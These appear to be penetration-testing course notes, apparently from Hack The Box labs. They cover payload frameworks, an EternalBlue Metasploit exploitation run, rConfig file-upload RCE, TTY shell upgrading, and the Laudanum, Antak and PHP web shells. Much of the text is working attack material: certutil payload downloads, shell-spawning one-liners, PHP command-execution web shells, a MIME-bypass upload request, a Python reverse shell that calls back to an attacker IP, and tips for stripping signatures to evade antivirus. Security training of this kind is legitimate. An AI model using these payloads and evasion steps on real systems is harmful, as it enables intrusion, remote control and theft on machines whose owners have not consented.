|**VBScript**|`.vbs`|Executed by Windows Script Host (`wscript.exe` / `cscript.exe`).|Phishing attachments and legacy macro execution.|
|**Installer Package**|`.msi`|Executed via `msiexec.exe /q /i payload.msi`.|Bypassing restrictive environments via elevated installer privileges (`AlwaysInstallElevated`).|
|**PowerShell Script**|`.ps1`|Interpreted by `powershell.exe` (.NET CLR).|Fileless in-memory execution, C2 stagers, and advanced post-exploitation modules.|

##  Payload Creation Frameworks & Resources

| **Tool / Resource**                                                             | **Primary Function**                           | **Offensive Utility**                                                                                           |
| ------------------------------------------------------------------------------- | ---------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| [**MSFVenom & Metasploit**](https://github.com/rapid7/metasploit-framework)     | Multi-platform binary generator & C2 framework | Generates custom shellcode, raw binaries (`.exe`, `.elf`), and web shells across platforms.                     |
| [**PayloadsAllTheThings**](https://github.com/swisskyrepo/PayloadsAllTheThings) | Open-source offensive repository               | Provides comprehensive cheat sheets for command injection, payloads, and one-liner transfer scripts.            |
| [**Mythic C2 Framework**](https://github.com/its-a-feature/Mythic)              | Cross-platform Command & Control (C2)          | Alternative C2 architecture offering custom implants (agents) and extensible communication profiles.            |
| [**Nishang**](https://github.com/samratashok/nishang)                           | PowerShell offensive framework                 | A collection of PowerShell scripts for initial access, privilege escalation, and in-memory reverse/bind shells. |
| [**Darkarmour**](https://github.com/bats3c/darkarmour)                          | Binary obfuscation tool                        | Encrypts and obfuscates Windows binaries to evade signature-based Antivirus (AV) detection.                     |

##  Transfer Vectors & Remote Execution Protocols

```
                          ┌─────────────────────────────────────┐
                          │    Attacker Payload Repository      │
                          └──────────────────┬──────────────────┘
                                             │
      ┌──────────────────────┬───────────────┴───────────────┬──────────────────────┐
      ▼                      ▼                               ▼                      ▼
+-----------+          +-----------+                   +-----------+          +-----------+
|    SMB    |          | Impacket  |                   | Web/HTTP  |          | FTP/TFTP  |
| C$ / ADMIN$|         | psexec/wmi|                   | certutil  |          | Native CLI|
+-----------+          +-----------+                   +-----------+          +-----------+
```

- **Impacket Suite:** Python-based networking framework providing direct protocol interaction scripts (`psexec.py`, `wmiexec.py`, `smbclient.py`, and `smbserver.py`) for file transfer and remote code execution.
- **SMB Shares (`C$`, `ADMIN$`):** Native Windows file sharing protocols allow authenticated users to drop binaries, stage execution scripts, and exfiltrate data over administrative shares.
- **Native Transfer Protocols (HTTP/FTP/TFTP):** Leveraging built-in Windows utilities (e.g., `certutil -urlcache -split -f http://<IP>/payload.exe payload.exe` or PowerShell `Invoke-WebRequest`) to fetch external payloads.
- **Metasploit Automated Execution:** Exploitation modules automate binary staging, staging memory allocation, and remote thread execution within a single workflow.
## 4. End-to-End Exploitation Workflow: MS17-010 (EternalBlue)

### Step 1: Target Discovery Scan

Scan SMB service ports across the network to identify host metrics:

```bash
enamto@htb[/htb]$ nmap -v -A 10.129.201.97
```

### Step 2: Vulnerability Verification with Metasploit

Verify susceptibility without crashing the remote SMB service pool:

```bash
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.201.97:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64
```

### Step 3: Exploit Execution & Shell Catch

```bash
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.201.97
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.14.12
msf6 exploit(windows/smb/ms17_010_psexec) > set LPORT 4444
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.12:4444 
[+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.201.97:50215)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## 5. Command Shell Comparison: CMD vs. PowerShell

Dropping into a system shell requires choosing the proper command environment based on stealth requirements and OS architecture.

```
                  ┌──────────────────────────────────────────────┐
                  │ Target Windows Host (Interactive Access)     │
                  └──────────────────────┬───────────────────────┘
                                         │
                   ┌─────────────────────┴─────────────────────┐
                   ▼                                           ▼
      +------------------------+                  +------------------------+
      |       cmd.exe          |                  |     PowerShell.exe     |
      | - Unstructured text    |                  | - Structured .NET      |
      | - No default logging   |                  | - ScriptBlock Logging  |
      | - Works on legacy OS   |                  | - AMSI / Execution Pol |
      +------------------------+                  +------------------------+
```

|**Decision Criteria**|**CMD (cmd.exe)**|**PowerShell (powershell.exe)**|
|---|---|---|
|**Object Model**|Plain Unstructured Text Streams|Rich .NET Framework / C# Objects|
|**Operational Footprint**|Low logging profile; does not leave ScriptBlock / Module logs by default.|High visibility; subject to AMSI, Transcription, and Event ID 4104 logging.|
|**Bypass Restrictions**|Not affected by Execution Policies (`Set-ExecutionPolicy`).|Governed by Execution Policies (can be bypassed with `-ExecutionPolicy Bypass`).|
|**Legacy Compatibility**|Native on all Windows versions (including Windows 2000 / XP).|Installed by default on Windows 7 / Server 2008 and newer.|
|**Best Used When**|Executing simple `net` commands, batch scripts, or remaining stealthy.|Interacting with Active Directory objects, C2 stagers, and complex post-exploitation scripts.|

---

# Unix/Linux Exploitation & Interactive Shell Upgrading

## Overview

Over 70% of web servers globally run on Unix/Linux-based operating systems. Gaining interactive shell access on these hosts frequently involves identifying web application vulnerabilities, executing remote code execution (RCE) payloads, and upgrading "dumb" non-interactive web shells into fully functional TTY terminals for post-exploitation and lateral movement.

## 1. Core Enumeration & Targeted Vulnerability Assessment

When target scanning reveals web stack components (e.g., Apache, Nginx, MySQL, PHP), enumeration must pivot to identifying hosted web applications and their exact version numbers.

### Nmap Web Server Enumeration

```bash
enamto@htb[/htb]$ nmap -sC -sV 10.129.201.101
```

```bash
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) PHP/7.2.34)
3306/tcp open  mysql    MySQL (unauthorized)
```

```
[ Nmap Enumeration ] ──> [ Identify Web App: rConfig 3.9.6 ] ──> [ Exploit RCE Vector ] ──> [ Web Shell ]
```

## 2. Exploiting Web Application Vulnerabilities (rConfig 3.9.6 RCE)

`rConfig` is a network configuration management tool. Exploiting an authenticated file upload flaw (`rconfig_vendors_auth_file_upload_rce`) allows uploading a PHP reverse shell payload that executes system commands as the web server user (`apache` or `www-data`).

![[Pasted image 20260812155653.png]]

### Adding External MSF Modules Manually

If a specific Metasploit module (`.rb`) is missing locally:

```bash
enamto@htb[/htb]$ locate exploits
# Save external module to:
# /usr/share/metasploit-framework/modules/exploits/linux/http/rconfig_vendors_auth_file_upload_rce.rb
```

### Module Execution & Shell Catch

```bash
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > set RHOSTS 10.129.201.101
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > set LHOST 10.10.14.111
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.111:4444 
[+] 3.9.6 of rConfig found !
[*] Uploading file 'olxapybdo.php' containing the payload...
[*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860)

meterpreter > shell
Process 3958 created.
sh-4.2$ whoami
apache
```

## 3. Linux TTY Shell Upgrading Techniques

Initial web shells spawned by web daemons (`apache`, `nginx`, `www-data`) are non-interactive (**non-TTY**). They lack job control, tab completion, arrow key navigation, and prevent tools like `su`, `sudo`, or `vi` from running properly.

```
+--------------------------+                         +--------------------------+
|    Non-TTY Web Shell     |                         |  Full Interactive TTY    |
| - No Tab Completion      |  ====================>  | - Tab Completion         |
| - Ctrl+C kills shell     |    TTY Upgrade Path     | - Job Control (Ctrl+C)   |
| - `su` / `sudo` breaks   |                         | - PTY terminal support   |
+--------------------------+                         +--------------------------+
```

### ->  Spawn Initial PTY Shell
Establishes basic PTY allocation

Check for Python on the target host and execute the `pty.spawn` module:

```bash
which python3 || which python
python -c 'import pty; pty.spawn("/bin/bash")'
```
### ->  Background the Shell & Modify Terminal Raw Mode
Fixes Ctrl+C handling and echo on attacker box

Suspend the shell session back to your local terminal and set terminal raw mode:

```bash
# Press Ctrl + Z inside the netcat session
zsh: suspended  nc -lvnp 4444

# On your attacker machine:
stty raw -echo; fg
```
### ->  Configure Environment Variables & Window Size
Restores clear screens, text editors, and terminal dimensions

Reset terminal type and set row/column dimensions matching your local terminal emulator:

```bash
export TERM=xterm-256color

# Check local rows/cols: stty size (e.g., 40 rows 160 cols)
stty rows 40 cols 160
```

## 4. One-Liner PTY Spawning Reference

| **Language / Utility** | **Command Syntax**                                                                                                                        |
| ---------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| **Python 3**           | `python3 -c 'import pty; pty.spawn("/bin/bash")'`                                                                                         |
| **Python 2**           | `python -c 'import pty; pty.spawn("/bin/bash")'`                                                                                          |
| **Script Command**     | `/usr/bin/script -qc /bin/bash /dev/null`                                                                                                 |
| **Socat (Full TTY)**   | `socat file:\`tty`,raw,echo=0 tcp-listen:4444 `*(Attacker)*<br>`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp::4444` _(Target)_ |

---

# Interactive Shell Spawning & TTY Upgrading

## Overview

When dropping onto a target Linux system via remote code execution, initial access usually yields a **non-interactive (dumb) shell**. These shells lack job control, PTY (pseudo-terminal) support, command history, auto-completion, and break when executing interactive binaries (e.g., `su`, `sudo`, `vim`, `ssh`).

Spawning an interactive TTY shell bypasses restricted execution environments ("jail shells") and provides full terminal controls essential for privilege escalation.

## 1. Living Off The Land: Interactive Shell Spawning

If `python` or `python3` is missing on the target host, alternative interpreters and standard system utilities can be leveraged to spawn an interactive shell.

```
                              ┌─────────────────────────────────────────┐
                              │     Non-Interactive Web/Dumb Shell      │
                              └────────────────────┬────────────────────┘
                                                   │
         ┌───────────────────┬─────────────────────┼─────────────────────┬───────────────────┐
         ▼                   ▼                     ▼                     ▼                   ▼
   +-----------+       +-----------+         +-----------+         +-----------+       +-----------+
   | /bin/sh   |       | Scripting |         | AWK / SED |         | Find Exec |       | VIM Exec  |
   |  -i Flag  |       | Perl/Ruby |         | System()  |         | Binary -e |       | :!/bin/sh |
   +-----------+       +-----------+         +-----------+         +-----------+       +-----------+
```

### Interpreter & Utility Spawning Cheatsheet

| **Utility / Language** | **Command Syntax**                                             | **Notes**                                                       |
| ---------------------- | -------------------------------------------------------------- | --------------------------------------------------------------- |
| **Interactive Shell**  | `/bin/sh -i` or `/bin/bash -i`                                 | Invokes the shell directly in interactive mode (`-i`).          |
| **Perl**               | `perl -e 'exec "/bin/sh";'`                                    | Executes shell binary directly from Perl runtime.               |
| **Ruby**               | `ruby -e 'exec "/bin/sh"'`                                     | Spawns standard shell interface via Ruby.                       |
| **Lua**                | `lua -e 'os.execute("/bin/sh")'`                               | Uses Lua's standard OS execution library.                       |
| **AWK**                | `awk 'BEGIN {system("/bin/sh")}'`                              | Triggers shell execution during AWK initialization block.       |
| **Find Utility**       | `find . -exec /bin/sh \; -quit`                                | Uses `find` binary execution flag to spawn shell directly.      |
| **Find + AWK**         | `find / -name "file" -exec awk 'BEGIN {system("/bin/sh")}' \;` | Chains `find` and `awk` execution primitives.                   |
| **VIM (Inline)**       | `vim -c ':!/bin/sh'`                                           | Launches VIM and immediately executes an escaped shell command. |
| **VIM (Interactive)**  | Inside VIM: `:set shell=/bin/sh` then `:shell`                 | Overrides default shell setting and drops into terminal mode.   |

## 2. Privilege Checks & Sudo Permissions

Interactive shells are required to execute commands that prompt for user input, password validation, or terminal interaction.

### Inspecting Sudo Rights (`sudo -l`)

To list allowed administrative commands for the current user session:

```bash
sh-4.2$ sudo -l

Matching Defaults entries for apache on ILF-WebSrv:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin

User apache may run the following commands on ILF-WebSrv:
    (ALL : ALL) NOPASSWD: ALL
```

> **Requirement:** Running `sudo -l` on entries requiring password authentication or interactive input will fail or hang indefinitely in a non-interactive shell. A stable PTY shell must be established first.

### File Binary Permissions Check

```bash
ls -la /path/to/target/binary
```

---

# Introduction to Web Shells & Laudanum Framework

## Overview

A **Web Shell** is a browser-based command execution interface dropped onto a web server following successful file upload exploitation, Remote File Inclusion (RFI), Local File Inclusion (LFI) with log poisoning, or administrative misconfigurations (e.g., exposed Tomcat manager consoles or misconfigured FTP web roots).

While web shells provide initial Remote Code Execution (RCE), they are inherently **unstable and stateless**. Their primary operational purpose is to serve as an initial foothold to escalate access and spawn a fully interactive **Reverse Shell** back to the attacker infrastructure.

```
[ Web Application Vulnerability ] ──> [ Upload Payload (PHP/ASPX/JSP) ] ──> [ Execute Commands via Browser ] ──> [ Upgrade to Reverse Shell ]
```

## 1. Perimeter Exposure & Web Attack Vectors

In modern enterprise networks, perimeter security heavily restricts incoming access to traditional infrastructure services (like SMB, RDP, or SSH). Consequently, web applications form the largest exposed attack surface during external penetration testing.

### Primary Foothold Vectors

|**Vector / Flaw**|**Operational Mechanism**|**Common Extension Dropped**|
|---|---|---|
|**Unrestricted File Upload**|Bypass client-side or weak server-side mime/extension filters on profile photos or document attachments.|`.php`, `.phtml`, `.aspx`, `.jsp`|
|**LFI / RFI (File Inclusion)**|Poisoning log files (`/var/log/apache2/access.log`, Windows Event logs) or pulling remote scripts.|Raw code execution via wrapper|
|**Application Deployment**|Utilizing management portals (Tomcat, WebLogic, Axis2) to deploy packaged archives.|`.war`, `.ear`|
|**FTP Webroot Misconfiguration**|Anonymous or weakly authenticated write access directly to the HTTP root directory.|Direct binary/script drop|

## 2. The Laudanum Web Shell Framework

**Laudanum** is a built-in repository of pre-crafted, security-focused web shell payloads designed for multiple web application architectures (`ASP`, `ASPX`, `JSP`, `PHP`). It includes IP-restriction mechanisms to prevent unauthorized third-party access to the dropped shell.

### Directory Location (Linux / Kali / Parrot OS)

```bash
/usr/share/laudanum/
```

### Supported Languages & Modules

- **ASPX / ASP:** Windows IIS servers (.NET Framework)
- **PHP:** Linux/Apache/Nginx/IIS PHP engines
- **JSP:** Java Application Servers (Tomcat, GlassFish, WebLogic)

## 3. Practical Workflow: Deploying an ASPX Web Shell

### Step 1: Copy & Prepare the Payload

Copy the default Laudanum ASPX shell to your local working directory and inspect parameters:

```bash
cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```

### Step 2: Configure Access Control & Strip Signatures

To ensure access and bypass basic signature-based Antivirus/EDR detection:

1. Open `demo.aspx` in a text editor.
2. Edit line 59: Add your attacker IP to the `allowedIps` array (e.g., `allowedIps = "10.10.14.x"`).
3. **OPSEC Tip:** Strip out default ASCII art headers, author comments, and vendor tags to evade static signature detection.

```C#

// Example IP restriction configuration inside shell.aspx
string[] allowedIps = new string[] { "10.10.14.x" };
```

![[Pasted image 20260812191416.png]]
### Step 3: File Upload & Path Traversal Access

Upload `demo.aspx` through the vulnerable web application form.

1. **Upload Execution:** The application saves the file under `files/demo.aspx`.

![[Pasted image 20260812191601.png]]

2. **Accessing the Shell:** Navigate to the uploaded script via your web browser:
   `http://status.inlanefreight.local//files/demo.aspx`

![[Pasted image 20260812191616.png]]

3. **Executing Commands:** Enter system commands (e.g., `systeminfo`, `whoami`, `ipconfig`) directly within the browser interface.

![[Pasted image 20260812191803.png]]

## 4. Web Shell vs. Interactive Reverse Shell

|**Metric**|**Web Shell (Browser-Based)**|**Interactive Reverse Shell (nc / Meterpreter)**|
|---|---|---|
|**Protocol**|HTTP / HTTPS (Stateless Request/Response)|Raw TCP / Encrypted Socket Stream|
|**Interactive Commands**|No (`su`, `sudo`, `ssh`, or interactive prompts fail)|Full support for job control and TTY interfaces|
|**Persistence**|Low (Subject to web server file cleanup scripts)|Medium-High (Can spawn backgrounded system daemons)|
|**Network Footprint**|Logged in HTTP access logs (`access.log`)|Raw socket traffic; bypasses web server logging|

---

# Antak Web Shell & ASPX Exploitation

## Overview

**Active Server Pages Extended (ASPX)** is an extension for Microsoft’s ASP.NET Framework. On IIS web servers, ASPX scripts are parsed server-side, allowing operators to execute .NET code and system commands within the web server process context.

**Antak** is an ASPX-based web shell bundled inside the **Nishang** offensive PowerShell toolkit (`/usr/share/nishang/Antak-WebShell`). It functions as an in-browser PowerShell console, capable of executing memory-resident scripts, uploading/downloading files, and running encoded command streams on Windows IIS targets.

```
[ Unrestricted Upload / IIS ] ──> [ Upload antak.aspx ] ──> [ Authenticated Web Console ] ──> [ PowerShell / C2 Stager ]
```

## 1. Features & Security Controls of Antak

Unlike standard primitive web shells, Antak provides advanced administrative and offensive capabilities out of the box:

- **Authentication Lock:** Built-in username and password verification to prevent third-party access or unauthorized exploitation during assessments.
- **In-Memory Script Execution:** Ability to load and execute PowerShell scripts directly into system memory without writing artifacts to disk.
- **Process Execution Model:** Executes each command string in a isolated sub-process context while preserving directory tracking.
- **In-Browser Shell UI:** Designed to visually mimic an interactive PowerShell console directly inside the web browser.

## 2. Practical Configuration & Deployment Workflow

### Step 1: Copy Payload & Configure Credentials

Copy the default Antak script from the local Nishang directory to your working directory:

```bash
enamto@htb[/htb]$ cp /usr/share/nishang/Antak-WebShell/antak.aspx ./Upload.aspx
```

### Step 2: Set Credentials & Strip Static Signatures

Open `Upload.aspx` in a text editor to set mandatory access credentials and remove signature flags:

1. **Configure Credentials (Line 14):** Update `$User` and `$Password` variables to secure the web shell.
2. **OPSEC Clean-up:** Remove default Nishang ASCII art headers and developer comments to evade static Antivirus (AV) and Web Application Firewall (WAF) signatures.

```C#
// Line 14 inside antak.aspx
string User = "admin";
string Password = "ComplexPassword123!";
```

![[Pasted image 20260812194834.png]]
### Step 3: Upload & Authenticated Execution

Upload `Upload.aspx` through the vulnerable web application upload form:

1. **Upload Target:** File is saved to the IIS web directory (e.g., `status.inlanefreight.local\files\Upload.aspx`).
2. **Web Browser Access:** Navigate to the shell endpoint:
   `http://status.inlanefreight.local/files/Upload.aspx`
3. **Login Prompt:** Enter the username (`admin`) and password (`ComplexPassword123!`) configured in Step 2.

![[Pasted image 20260812194906.png]]

4. **Command Execution:** Run PowerShell cmdlets (`Get-Process`, `Get-ChildItem`, `whoami`) or use the `help` menu to explore built-in transfer and execution switches.

![[Pasted image 20260812194941.png]]

## 3. Web Shell Comparison: Laudanum vs. Antak

|**Feature / Metric**|**Laudanum (shell.aspx)**|**Antak (antak.aspx)**|
|---|---|---|
|**Framework Base**|Basic C# / ASPX|Nishang Offensive PowerShell Framework|
|**Access Control**|IP Whitelisting (`allowedIps`)|Form Authentication (Username & Password)|
|**Execution Engine**|`cmd.exe` process spawning|Native PowerShell Engine (.NET)|
|**File Operations**|Primitive text / file reading|Integrated upload, download, and script staging|
|**Primary Use Case**|Initial simple command execution|Advanced PowerShell post-exploitation and staging|

---

# PHP Web Shells & File Upload Bypass

## Overview

PHP powers over 78% of server-side web applications globally. When penetration testing web applications built on PHP stacks (LAMP/LEMP), exploiting file upload mechanisms allows dropping a PHP script into the webroot to gain initial **Remote Code Execution (RCE)**.

Because simple web shells are stateless, limited, and logged by web servers, operators use them primarily to achieve an initial foothold before pivoting to an interactive **Reverse Shell**.

```
[ Unrestricted / Bypassed Upload ] ──> [ Drop connect.php ] ──> [ Execute Web Shell ] ──> [ Upgrade to Reverse Shell ]
```

## 1. File Upload Filter Bypass (MIME/Content-Type)

Web applications often enforce extension and MIME-type checks to restrict uploads to safe file formats (e.g., `.png`, `.jpg`, `.gif`). Client-side or naive server-side MIME checks rely on the HTTP `Content-Type` header, which can be intercepted and modified via an HTTP proxy like Burp Suite.

### Intercepted HTTP Request Modification

```http
POST /vendors/addVendor.php HTTP/1.1
Host: rconfig.inlanefreight.local
Content-Type: multipart/form-data; boundary=---------------------------123456789

-----------------------------123456789
Content-Disposition: form-format; name="vendorLogo"; filename="connect.php"
Content-Type: image/gif

<?php system($_GET['cmd']); ?>
-----------------------------123456789--
```

#### Key Modifications

- **Filename:** Retains the `.php` extension (`connect.php`) so the web server parses and executes the script.
    
- **Content-Type Header:** Changed from `application/x-php` to `image/gif` to bypass naive MIME validation.
    

## 2. Minimal & Feature-Rich PHP Web Shells

### Minimal One-Liner Web Shells

```php
/* Primitive GET parameter shell */
<?php system($_GET['cmd']); ?>

/* Exec wrapper shell */
<?php echo shell_exec($_GET['cmd']); ?>

/* Passthru wrapper shell */
<?php passthru($_GET['cmd']); ?>
```

Usage in browser:

```http
http://target.com/images/vendor/connect.php?cmd=whoami
```

## 3. Web Shell Limitations & Operational Risks

|**Operational Metric**|**Web Shell (HTTP Stream)**|**Interactive Reverse Shell (nc / Meterpreter)**|
|---|---|---|
|**State Persistence**|Stateless; directory resets between requests (`cd /tmp` won't stick).|Stateful; active persistent working directory.|
|**Command Chaining**|Unstable (`whoami && id` can fail depending on functions).|Native shell command chaining (`&&`, `\|`).|
|**Interactive Binaries**|Fails on interactive prompts (`su`, `sudo`, `ssh`, `vim`).|Supported via PTY allocation (`python -c 'import pty...'`).|
|**Persistence Risk**|High; vulnerable to web app cleanup jobs or AV scans on disk.|Medium; execution runs from memory or background processes.|
|**Logging Footprint**|Every single command creates a discrete entry in web server `access.log`.|Traffic travels over a raw TCP/TLS socket bypass web logs.|

## 4. Upgrading PHP Web Shell to Interactive Reverse Shell

Once the PHP web shell is active, execute a reverse shell command string directly through the browser or `curl` to establish a persistent connection back to your netcat listener:

```bash
# Attacker Listener:
sudo nc -lvnp 443

# Trigger Outbound Reverse Shell via Web Shell URL:
http://target.com/images/vendor/connect.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.111%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```
